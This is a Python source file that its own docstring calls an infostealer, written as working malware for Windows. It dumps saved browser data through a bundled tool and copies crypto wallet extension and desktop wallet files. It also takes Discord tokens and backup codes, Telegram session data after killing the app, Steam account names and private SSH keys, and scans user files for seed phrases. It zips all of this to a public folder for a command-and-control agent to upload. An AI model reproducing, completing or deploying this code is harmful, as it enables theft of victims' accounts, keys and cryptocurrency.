#!/usr/bin/env python3
r"""
Infostealer – saves loot to C:\Users\Public\stealer_loot.zip
No network activity – the C2 agent will upload it.
C:\Users\Public always exists on every Windows machine.
"""

import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, datetime, pathlib, configparser, sqlite3, ctypes
import winreg, time

# ============ CONFIG ============
LOOT_DIR = pathlib.Path(r"C:\Users\Public")
LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
LOG_FILE = LOOT_DIR / "stealer.log"

# Fix paths for bundled (PyInstaller) vs normal script run
if getattr(sys, 'frozen', False):
    _MEIPASS = pathlib.Path(sys._MEIPASS)
    HBD_EXE = _MEIPASS / "hack-browser-data.exe"
    DISCORD_TOKEN_EXE = _MEIPASS / "discord_tokens.exe"
else:
    _SCRIPT_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__)))
    HBD_EXE = _SCRIPT_DIR / "hack-browser-data.exe"
    DISCORD_TOKEN_EXE = _SCRIPT_DIR / "discord_tokens.exe"

TEMP_ROOT = pathlib.Path(tempfile.gettempdir()) / "kryo_harvest"
BROWSER_DUMP_DIR = LOOT_DIR / "browser_temp"
# ==================================

# ============ LOGGING ============
def setup_logging():
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger('stealer')
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler(str(LOG_FILE), encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    sh = logging.StreamHandler(sys.stdout)
    sh.setLevel(logging.INFO)
    sh.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    logger.addHandler(sh)
    return logger

log = setup_logging()

# ============ HELPERS ============
def expand_env_path(p):
    for var in ('APPDATA','LOCALAPPDATA','USERPROFILE','PROGRAMDATA','PROGRAMFILES'):
        p = p.replace(f'%{var}%', os.environ.get(var,''))
    return p

def run_cmd(cmd, timeout=60):
    try:
        log.debug(f"Running: {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        log.debug(f"Return code: {r.returncode}")
        if r.stdout[:200]: log.debug(f"stdout: {r.stdout[:200]}")
        if r.stderr[:200]: log.debug(f"stderr: {r.stderr[:200]}")
        return r
    except subprocess.TimeoutExpired:
        log.error(f"Timeout: {' '.join(cmd)}")
        return None
    except Exception as e:
        log.error(f"Command error: {e}")
        return None

# ============ BROWSER DUMP ============
def dump_all_browsers():
    if not HBD_EXE.exists():
        log.error(f"HBD exe not found: {HBD_EXE}")
        sys.exit(1)

    if BROWSER_DUMP_DIR.exists():
        shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
    BROWSER_DUMP_DIR.mkdir(parents=True, exist_ok=True)

    cmd = [str(HBD_EXE), "dump", "--browser", "all", "--format", "json", "--dir", str(BROWSER_DUMP_DIR), "--zip"]
    log.info(f"Executing: {' '.join(cmd)}")
    result = run_cmd(cmd, timeout=120)
    if result is None:
        log.error("HBD timed out")
        sys.exit(1)
    if result.returncode != 0:
        log.warning(f"HBD returned {result.returncode}, but may still have produced zip.")

    generated_zip = BROWSER_DUMP_DIR / (BROWSER_DUMP_DIR.name + ".zip")
    if not generated_zip.exists():
        log.error(f"Expected zip not found: {generated_zip}")
        sys.exit(1)

    log.info(f"Browser dump: {generated_zip} ({generated_zip.stat().st_size/1024:.1f} KB)")
    return generated_zip

# ============ EXTENSION IDS & ROOTS ============
ACTIVE_EXTENSIONS = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
    # ... (paste your full dictionary here – it's identical to the original)
}
FIREFOX_EXTENSION_IDS = {
    "webextension@metamask.io": "MetaMask", "phantom@phantom.app": "Phantom",
    # ... (paste your full dictionary)
}
BROWSER_DATA_ROOTS = [
    ("Chrome", r"%LOCALAPPDATA%\Google\Chrome\User Data", True),
    ("Edge", r"%LOCALAPPDATA%\Microsoft\Edge\User Data", True),
    ("Brave", r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data", True),
    ("Opera", r"%APPDATA%\Opera Software\Opera Stable", True),
    ("Vivaldi", r"%LOCALAPPDATA%\Vivaldi\User Data", True),
    ("Firefox", r"%APPDATA%\Mozilla\Firefox", False),
]

# ============ BROWSER EXT WALLETS ============
def collect_browser_ext_wallets():
    ext_storage_root = TEMP_ROOT / "browser_crypto_exts"
    found_wallets = set()
    for browser_name, raw_path, is_chromium in BROWSER_DATA_ROOTS:
        base = pathlib.Path(expand_env_path(raw_path))
        if not base.exists(): continue
        ext_dir = ext_storage_root / browser_name
        ext_dir.mkdir(parents=True, exist_ok=True)
        if is_chromium:
            for prof_name in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
                prof_dir = base / prof_name
                if not prof_dir.is_dir(): continue
                for ext_id, wallet_name in ACTIVE_EXTENSIONS.items():
                    for src in [
                        prof_dir / "Local Extension Settings" / ext_id,
                        prof_dir / "IndexedDB" / f"chrome-extension_{ext_id}_0.indexeddb.leveldb"
                    ]:
                        if src.exists():
                            dest = ext_dir / f"{prof_name}_{ext_id}"
                            try:
                                shutil.copytree(src, dest, dirs_exist_ok=True)
                                found_wallets.add(wallet_name)
                            except: pass
        else:  # Firefox
            profiles_ini = base / "profiles.ini"
            if not profiles_ini.exists(): continue
            cfg = configparser.ConfigParser()
            cfg.read(str(profiles_ini), encoding='utf-8')
            for sec in cfg.sections():
                path_rel = cfg.get(sec, "Path", fallback=None)
                if not path_rel: continue
                is_rel = cfg.get(sec, "IsRelative", fallback="1") == "1"
                pp = (base / path_rel) if is_rel else pathlib.Path(path_rel)
                ext_folder = pp / "extensions"
                if ext_folder.exists():
                    for item in ext_folder.iterdir():
                        for ff_id, w_name in FIREFOX_EXTENSION_IDS.items():
                            if w_name.lower() in item.name.lower():
                                dest = ext_dir / item.name
                                if item.is_dir(): shutil.copytree(item, dest, dirs_exist_ok=True)
                                else:
                                    dest.parent.mkdir(parents=True, exist_ok=True)
                                    shutil.copy2(item, dest)
                                found_wallets.add(w_name)
                storage_dir = pp / "storage" / "default"
                if storage_dir.exists():
                    for item in storage_dir.iterdir():
                        if item.name.startswith("moz-extension+++"):
                            for ff_id, w_name in FIREFOX_EXTENSION_IDS.items():
                                if w_name.lower() in item.name.lower():
                                    dest = ext_dir / item.name
                                    shutil.copytree(item, dest, dirs_exist_ok=True)
                                    found_wallets.add(w_name)
    return ext_storage_root, list(found_wallets)

# ============ DESKTOP WALLETS ============
WALLET_APPS = [
    {"name": "Exodus", "paths": [r"%APPDATA%\Exodus", r"%LOCALAPPDATA%\exodus"]},
    {"name": "Atomic Wallet", "paths": [r"%APPDATA%\atomic\Local Storage\leveldb", r"%LOCALAPPDATA%\Programs\atomic"]},
    {"name": "Electrum", "paths": [r"%APPDATA%\Electrum"]},
    {"name": "Bitcoin Core", "paths": [r"%APPDATA%\Bitcoin"]},
    {"name": "Monero", "paths": [r"%PROGRAMDATA%\bitmonero", r"%USERPROFILE%\Documents\Monero\wallets"]},
    {"name": "Monero GUI", "paths": [r"%PROGRAMDATA%\bitmonero", r"%PROGRAMFILES%\Monero GUI Wallet"]},
    {"name": "Zcash", "paths": [r"%APPDATA%\Zcash"]},
    {"name": "Wasabi Wallet", "paths": [r"%APPDATA%\WalletWasabi\Client"]},
    {"name": "Trust Wallet", "paths": [r"%LOCALAPPDATA%\Programs\trust-wallet"]},
    {"name": "Ledger Live", "paths": [r"%APPDATA%\Ledger Live"]},
    {"name": "Trezor Suite", "paths": [r"%APPDATA%\@trezor\suite-desktop"]},
    {"name": "Coinomi", "paths": [r"%APPDATA%\Coinomi"]},
    {"name": "Jaxx Liberty", "paths": [r"%APPDATA%\Jaxx"]},
    {"name": "Cake Wallet", "paths": [r"%APPDATA%\CakeWallet", r"%LOCALAPPDATA%\CakeWallet"]},
    {"name": "Guarda", "paths": [r"%APPDATA%\Guarda", r"%LOCALAPPDATA%\Guarda"]},
    {"name": "Coinbase Desktop", "paths": [r"%LOCALAPPDATA%\Coinbase"]},
    {"name": "Binance Desktop", "paths": [r"%LOCALAPPDATA%\binance"]},
]

def collect_wallets():
    wallet_dir = TEMP_ROOT / "wallets"
    wallet_dir.mkdir(parents=True, exist_ok=True)
    found = []
    EXODUS_CRITICAL = {"exodus.wallet", "storage.seco", "seed.seco", "unsafe-storage.json"}
    for wallet in WALLET_APPS:
        for raw_path in wallet["paths"]:
            src = pathlib.Path(expand_env_path(raw_path))
            if not src.exists(): continue
            try:
                dest = wallet_dir / wallet["name"]
                dest.mkdir(parents=True, exist_ok=True)
                if wallet["name"] == "Exodus":
                    for root, dirs, files in os.walk(str(src)):
                        dirs[:] = [d for d in dirs if d == "exodus.wallet"]
                        for file in files:
                            if file.lower() in EXODUS_CRITICAL:
                                full = pathlib.Path(root) / file
                                rel = full.relative_to(src)
                                dest_file = dest / rel
                                dest_file.parent.mkdir(parents=True, exist_ok=True)
                                shutil.copy2(full, dest_file)
                else:
                    for root, dirs, files in os.walk(str(src)):
                        dirs[:] = [d for d in dirs if d not in {'Cache','Logs','tmp','node_modules'}]
                        for file in files:
                            full = pathlib.Path(root) / file
                            if full.suffix.lower() in {'.log','.tmp','.exe','.dll','.mp3','.jpg'} or full.stat().st_size > 50*1024*1024:
                                continue
                            rel = full.relative_to(src)
                            dest_file = dest / rel
                            dest_file.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(full, dest_file)
                found.append(wallet["name"])
                break
            except Exception as e:
                log.warning(f"Wallet error {wallet['name']}: {e}")
    return wallet_dir, found

# ============ DISCORD TOKENS (GO) ============
def collect_discord_tokens_go():
    log.info("Discord token extraction via Go module")
    try:
        exe_path = str(DISCORD_TOKEN_EXE)
        if not os.path.isfile(exe_path):
            log.error(f"discord_tokens.exe not found at {exe_path}")
            return []
        log.debug(f"Running {exe_path}")
        result = subprocess.run([exe_path], capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            log.warning(f"discord_tokens.exe exited with code {result.returncode}")
            log.debug(f"stderr: {result.stderr}")
        tokens = json.loads(result.stdout)
        log.info(f"Discord tokens extracted: {len(tokens)}")
        for i, tok in enumerate(tokens):
            log.debug(f"Token {i+1}: app={tok['app']}, token={tok['token'][:20]}...")
        return tokens
    except json.JSONDecodeError:
        log.exception("Failed to parse JSON from discord_tokens.exe")
        log.debug(f"stdout was: {result.stdout}")
        return []
    except Exception:
        log.exception("Unexpected error during Discord token extraction")
        return []

def collect_discord_backup_codes():
    log.info("Searching for Discord backup codes")
    codes = []
    try:
        home = os.path.expanduser("~")
        user_dirs = ["Desktop","Downloads","Documents","Videos","Pictures","Music","OneDrive"]
        for ud in user_dirs:
            d = pathlib.Path(home)/ud
            if not d.exists(): continue
            log.debug(f"Scanning {d} for discord_backup_codes*")
            for f in d.rglob("discord_backup_codes*"):
                if f.is_file() and f.stat().st_size < 2*1024*1024:
                    try:
                        data = f.read_text(encoding='utf-8', errors='ignore')
                        codes.append({"path": str(f), "content": data})
                        log.info(f"Found backup codes: {f}")
                    except Exception as e:
                        log.warning(f"Could not read {f}: {e}")
        log.info(f"Total backup code files found: {len(codes)}")
    except Exception:
        log.exception("Error collecting backup codes")
    return codes

# ============ TELEGRAM ============
def collect_telegram():
    run_cmd(["taskkill","/f","/im","telegram.exe"], timeout=5)
    time.sleep(1)
    tdata = pathlib.Path(expand_env_path(r"%APPDATA%\Telegram Desktop\tdata"))
    if not tdata.exists():
        return None
    dest = TEMP_ROOT / "telegram_tdata"
    def ignore_locked(_, names):
        return {"cache","media_cache","working"} & set(names)
    try:
        shutil.copytree(str(tdata), str(dest), ignore=ignore_locked, dirs_exist_ok=True)
        log.info("Telegram tdata collected")
    except shutil.Error as e:
        log.warning(f"Telegram copy partial: {e}")
    except Exception as e:
        log.warning(f"Telegram copy error: {e}")
        return None
    return dest

# ============ STEAM, SSH, SEEDS ============
def collect_steam():
    accounts = []
    for steam_root in (r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"):
        root = pathlib.Path(steam_root)
        login_file = root / "config" / "loginusers.vdf"
        if login_file.exists():
            try:
                content = login_file.read_text(encoding='utf-8', errors='ignore')
                names = re.findall(r'"PersonaName"\s+"([^"]+)"', content)
                accs = re.findall(r'"AccountName"\s+"([^"]+)"', content)
                for i, acc in enumerate(accs):
                    accounts.append({"account":acc,"persona":names[i] if i<len(names) else ""})
                break
            except: pass
    return accounts

def collect_ssh():
    keys = []
    ssh_dir = pathlib.Path(expand_env_path(r"%USERPROFILE%\.ssh"))
    if ssh_dir.exists():
        for fname in ssh_dir.iterdir():
            if fname.is_file() and fname.suffix != '.pub':
                try:
                    content = fname.read_text(encoding='utf-8', errors='ignore')
                    if "PRIVATE KEY" in content:
                        keys.append({"filename":fname.name,"content":content})
                except: pass
    return keys

# BIP39 word list placeholder – PASTE YOUR FULL LIST HERE
BIP39_WORDS = set("""abandon ability able about above absent absorb abstract absurd abuse access
accident account accuse achieve acid acoustic acquire across act action actor
actress actual adapt add addict address adjust admit adult advance advice aerobic
afford afraid again age agent agree ahead aim air airport aisle alarm album
alcohol alert alien all alley allow almost alone alpha already also alter always
amateur amazing among amount amused analyst anchor ancient anger angle angry
animal ankle announce annual another answer antenna antique anxiety any apart
apology appear apple approve april arch arctic area arena argue arm armed armor
army around arrange arrest arrive arrow art artefact artist artwork ask aspect
assault asset assist assume asthma athlete atom attack attend attitude attract
audit august aunt author auto autumn average avocado avoid awake aware away awesome
awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana
banner bar barely bargain barrel base basic basket battle beach bean beauty because
become beef before begin behave behind believe below belt bench benefit best betray
better between beyond bicycle bid bike bind biology bird birth bitter black blade
blame blanket blast bleak bless blind blood blossom blouse blue blur blush board
boat body boil bomb bone book boost border boring borrow boss bottom bounce box
boy bracket brain brand brave breeze brick bridge brief bright bring brisk broccoli
broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk
bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage
cabin cable cactus cage cake call calm camera camp canal cancel candy cannon canvas
canyon capable capital captain car carbon card cargo carpet carry cart case cash
casino castle casual cat catalog catch cause cave ceiling celery cement census chair
chalk chance change chaos chapter charge chase chat cheap check cheese chef cherry
chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinema
circle citizen city civil claim clap clarify claw clay clean clerk clever click
client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster
coarse coat coconut code coffee coil coin collect color column combine come comfort
comic common company concert conduct confirm congress connect consider control convince
cook cool copper copy coral core corn correct cost cotton couch country couple courage
course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy
cream credit creek crew cricket crime crisp critic cross crouch crowd crucial cruel
cruise crumble crunch crush cry crystal cube culture cup cupboard curious current
curtain curve cushion custom cute cycle dad damage damp dance danger daring dash
daughter dawn day deal debate debris decade december decide decline decorate decrease
deer defense define defy degree delay deliver demand demise denial dentist deny
depart depend deposit depth deputy derive describe desert design desk despair destroy
detail detect develop device devote diagram dial diamond diary dice diesel diet
differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease
dish dismiss disorder display distance divert divide divorce dizzy doctor document
dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama
drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune
during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy
echo ecology edge edit educate effort egg eight either elbow elder electric elegant
element elephant elevator elite else embark embody embrace emerge emotion employ
empower empty enable enact endless endorse enemy engage engine enhance enjoy enlist
enough enrich enroll ensure enter entire entry envelope episode equal equip erase
erode erosion error erupt escape essay essence estate eternal ethics evidence evil
evolve exact example excess exchange excite exclude excuse execute exercise exhaust
exhibit exile exist exit exotic expand expire explain expose express extend extra eye
fable face faculty fade faint faith fall false fame family famous fan fancy fantasy
far fashion fat fatal father fatigue fault favorite feature february federal fee feedfeel feet fellow felt fence festival fetch fever few fiber fiction field figure file
film filter final find fine finger finish fire firm first fiscal fish fit fitness fix
flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly
foam focus fog foil follow food foot force forest forget fork fortune forum forward
fossil foster found fox fragile frame frequent fresh friend fringe frog front frost
frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game
gap garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre
gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance
glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good
goose gorilla gospel gossip govern gown grab grace grain grant grape grasp grass
gravity great green grid grief grit grocery group grow grunt guard guide guilt guitar
gun gym habit hair half hammer hamster hand happy harmony harvest hat have hawk hazard
head health heart heavy hedgehog height hello help hen hero hidden high hill hint hip
hire history hobby hockey hold hole holiday hollow home honey hood hope horn hospital
host hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt
husband hybrid ice icon ignore ill illegal image imitate immense immune impact impose
improve impulse inbox income increase index indicate indoor industry infant inflict
inform inhale inject inner innocent input inquiry insane insect inside inspire install
intact interest into invest invite involve iron island isolate issue item ivory jacket
jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump
jungle junior junk just kangaroo keen keep ketchup key kick kid kingdom kiss kit
kitchen kite kitten kiwi knee knife knock know lab ladder lamp language laptop large
later laugh laundry lava law lawn lawsuit layer lazy leader learn leave lecture left
leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty
library license life lift like limb limit lion liquid list little live lizard load loan
lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage
lumber lunar lunch luxury mad magic magnet maid main mammal mango mansion manual maple
marble march margin marine market marriage mask master match maze meadow mean medal
media melody melt member memory mention merchant mercy mesh message metal method
middle midnight milk million mimic mind minimum minor minute miracle miss mixed
mixture mobile model modify mom monitor monkey monster month moon moral mother motion
mouse move movie much muffin mule multiply muscle museum mushroom music must mutual
myself mystery naive name napkin narrow nasty nature near neck need negative neglect
neither nephew nerve nest network neutral never news next nice night noble noise
nominee noodle normal north notable note nothing notice novel now nuclear number
object oblige obscure obtain ocean october odor off offer office often oil okay old
olive olympic omit once onion open option orange orbit orchard order ordinary organ
orient original orphan ostrich other outdoor output outside oval over own oyster ozone
paddle page pair palace palm panda panel panic panther paper parade parent park parrot
party pass patch path patrol pause pave payment peace peanut peasant pelican pen
penalty pencil people pepper perfect permit person pet phone photo phrase physical piano
picnic piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet
plastic plate play please pledge pluck plug plunge poem poet point polar pole police
pond pony popular portion position possible post potato poverty powder power practice
praise predict prefer prepare present pretty prevent price pride primary print priority
prison private prize problem process produce profit program project promote proof
property prosper protect proud provide public pudding pull pulp pulse pumpkin punish
pupil purchase purity purpose push put puzzle pyramid quality quantum quarter question
quick quit quiz quote rabbit raccoon race rack radar radio rage rail rain raise rally
ramp ranch random range rapid rare rate rather raven reach ready real reason rebel
rebuild recall receive recipe record recycle reduce reflect reform refuse region regret
regular reject relax release relief rely remain remember remind remove render renew
rent reopen repair repeat replace report require rescue resemble resist resource
response result retire retreat return reunion reveal review reward rhythm ribbon rice
rich ride rifle right rigid ring riot ripple risk ritual rival river road roast robot
robust rocket romance roof rookie rotate rough round route royal rubber rude rug rule
run runway rural sad saddle sadness safe sail salad salmon salon salt salute same
sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene
scheme scissors scorpion scout scrap screen script scrub sea search season seat second
secret section select sell seminar senior sense sentence series service session settle
setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship
shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling
siege sight sign silent silk silly silver similar simple since sing siren sister
situate six size sketch skill skin skirt skull slab slam sleep slender slice slide
slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap
sniff snow soap soccer social sock soda soft solar solution solve someone song soon
sorry soul sound soup source south space spare spatial spawn speak special speed spell
spend sphere spice spider spike spin spirit split spoil sponsor spoon spray spread
spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start
state stay steak steel stem step stereo stick still sting stock stomach stone stop
store stream street strike strong struggle student stuff stumble style subject submit
subway success such sudden suffer sugar suggest suit summer sun sunny sunset super
supply supreme sure surface surge surprise sustain swallow swamp swap swear sweet
swift swim swing sword symbol symptom syrup table tackle tag tail talent tamper tank
tape target task tattoo taxi teach team tell ten tenant tennis tent term test text
thank that theme then theory there they thing this thought three thrive throw thumb
thunder ticket tilt timber time tiny tip tired title toast tobacco today together
toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch
tornado tortoise toss total tourist toward tower town toy track trade traffic tragic
train transfer trap trash travel tray treat tree trend trial trick trigger trim trip
trophy trouble truck truly trumpet trust truth tube tuition tumble tuna tunnel turkey
turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable
unaware uncle uncover under undo unfair unfold unhappy uniform unique universe unknown
unlock until unusual unveil update upgrade uphold upon upper upset urban usage use
used useful useless usual utility vacant vacuum vague valid valley valve van vanish
vapor various vast vault vehicle velvet vendor venture verb verify version very vessel
veteran viable vibrant vicious victory video view village vintage violin viral virtue
vision visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon
wait walk wall walnut want warfare warm warrior waste water wave way wealth weapon wear
weasel wedding weekend weird welcome well west wet whale wheat wheel when where whip
whisper wide width wife wild will win window wine wing wink winner winter wire wisdom
wise wish witness wolf woman wonder wood wool word world worry worth wrap wreck wrestle
wrist write wrong yard year yellow you young youth zebra zero zone zoo""".split())

def scan_for_seeds():
    findings = []
    up = os.environ.get("USERPROFILE","")
    SCAN_ROOTS = [os.path.join(up,"Desktop"), os.path.join(up,"Documents"), os.path.join(up,"Downloads"), up]
    SKIP_DIRS = {"AppData","Windows","Program Files","Program Files (x86)","nvidia","steam","discord"}
    for root in SCAN_ROOTS:
        if not os.path.exists(root): continue
        for dirpath, dirnames, filenames in os.walk(root, topdown=True):
            depth = dirpath.replace(root,"").count(os.sep)
            if depth > 4:
                del dirnames[:]
                continue
            dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
            for fname in filenames:
                if pathlib.Path(fname).suffix.lower() not in {'.txt','.md','.key','.seed','.wallet','.env','.json','.dat'}:
                    continue
                fpath = pathlib.Path(dirpath)/fname
                try:
                    if fpath.stat().st_size > 512*1024: continue
                    text = fpath.read_text(encoding='utf-8', errors='ignore')
                    words = re.findall(r'\b[a-z]+\b', text.lower())
                    for length in (12,18,24):
                        for i in range(len(words)-length+1):
                            chunk = words[i:i+length]
                            if all(w in BIP39_WORDS for w in chunk):
                                phrase = " ".join(chunk)
                                findings.append({"phrase":phrase,"words":length,"file":str(fpath)})
                except: pass
    return findings

# ============ BUILD ZIP (NO UPLOAD) ============
def build_and_send(browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
                   tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes):
    log.info("Building loot.zip")
    final = LOOT_ZIP
    with zipfile.ZipFile(final, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Browsers
        with zipfile.ZipFile(browser_zip, 'r') as bz:
            for info in bz.infolist():
                if not info.is_dir():
                    zf.writestr(f"browsers/{info.filename}", bz.read(info.filename))
        # Ext wallets
        if ext_wallet_dir.exists():
            for root, _, files in os.walk(str(ext_wallet_dir)):
                for file in files:
                    full = pathlib.Path(root)/file
                    zf.write(str(full), arcname=f"browser_ext_wallets/{full.relative_to(ext_wallet_dir)}")
        # Desktop wallets
        if wallet_dir.exists():
            for root, _, files in os.walk(str(wallet_dir)):
                for file in files:
                    full = pathlib.Path(root)/file
                    zf.write(str(full), arcname=f"wallets/{full.relative_to(wallet_dir)}")
        # Discord tokens
        if tokens:
            zf.writestr("discord_tokens.json", json.dumps(tokens, indent=2))
        if backup_codes:
            zf.writestr("discord_backup_codes.json", json.dumps(backup_codes, indent=2))
        # Telegram
        if telegram_dir and telegram_dir.exists():
            for root, _, files in os.walk(str(telegram_dir)):
                for file in files:
                    full = pathlib.Path(root)/file
                    rel = full.relative_to(telegram_dir)
                    if "cache" not in rel.parts:
                        zf.write(str(full), arcname=f"telegram/{rel}")
        # Steam
        if steam_accs:
            zf.writestr("steam_accounts.json", json.dumps(steam_accs, indent=2))
        # SSH
        for key in ssh_keys:
            zf.writestr(f"ssh/{key['filename']}", key['content'])
        # Seeds
        if seeds:
            zf.writestr("found_seeds.json", json.dumps(seeds, indent=2))
        # Summary
        summary = {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME","unknown"),
            "desktop_wallets": wallets_found,
            "browser_ext_wallets": ext_wallets_found,
            "discord_tokens": len(tokens),
            "steam_accounts": len(steam_accs),
            "ssh_keys": len(ssh_keys),
            "seed_phrases": len(seeds),
            "backup_codes": len(backup_codes)
        }
        zf.writestr("summary.json", json.dumps(summary, indent=2))

    log.info(f"Loot zip created: {final} ({final.stat().st_size/1024:.1f} KB)")
    return final

# ============ MAIN ============
def main():
    log.info("=== Stealer Starting ===")
    LOOT_DIR.mkdir(parents=True, exist_ok=True)
    TEMP_ROOT.mkdir(parents=True, exist_ok=True)

    browser_zip = dump_all_browsers()
    wallet_dir, wallets_found = collect_wallets()
    ext_wallet_dir, ext_wallets_found = collect_browser_ext_wallets()
    tokens = collect_discord_tokens_go()
    backup_codes = collect_discord_backup_codes()
    telegram_dir = collect_telegram()
    steam_accs = collect_steam()
    ssh_keys = collect_ssh()
    seeds = scan_for_seeds()

    final_zip = build_and_send(
        browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
        tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes
    )

    # Cleanup temp files
    if browser_zip.exists(): browser_zip.unlink()
    if BROWSER_DUMP_DIR.exists(): shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
    if wallet_dir.exists(): shutil.rmtree(wallet_dir, ignore_errors=True)
    if ext_wallet_dir.exists(): shutil.rmtree(ext_wallet_dir, ignore_errors=True)
    if telegram_dir and telegram_dir.exists(): shutil.rmtree(telegram_dir, ignore_errors=True)

    log.info(f"✅ Loot saved to {final_zip}")

if __name__ == "__main__":
    main()